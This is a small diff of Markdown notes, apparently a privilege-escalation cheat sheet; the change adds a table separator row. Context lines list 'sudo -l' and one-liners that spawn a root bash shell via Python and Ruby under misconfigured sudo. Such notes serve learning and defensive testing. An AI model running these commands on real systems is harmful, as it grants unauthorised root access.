@@ -14,6 +14,7 @@ sudo -l
 
 *Exploiting Misconfigured `sudo`*
 | # | Language | Commands |
+| --- | --- | --- |
 | 1 | Python | `sudo python3 -c 'import os; os.system("/bin/bash")'`
 | 2 | Ruby | `sudo ruby -e 'system("/bin/bash")'` |
 | 3 | NodeJS | `node -e '[...]()'` |
